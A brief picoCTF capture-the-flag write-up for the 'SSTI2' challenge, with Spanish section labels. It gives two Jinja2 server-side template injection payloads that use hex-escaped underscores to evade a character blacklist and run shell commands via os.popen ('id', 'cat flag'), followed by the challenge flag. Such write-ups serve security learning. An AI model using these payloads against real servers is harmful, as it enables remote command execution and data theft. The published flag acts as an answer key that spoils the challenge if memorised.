# 9 - SSTI2

## Descripcion:
* I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)
Additional details will be available after launching your challenge instance.
* Server Side Template Injection
* Why is blacklisting characters a bad idea to sanitize input?

## Solucion:
* http://shape-facility.picoctf.net:55973
* {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
* {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
* picoCTF{sst1_f1lt3r_byp4ss_3cfcf706}

## Notas:
* ingresamos a la pagina
* probamos texto que corrompa y nos de la bandera
* decimos que nos de la bandera con cat flag
* bandera

## Referencias:
* https://onsecurity.io/article/server-side-template-injection-with-jinja2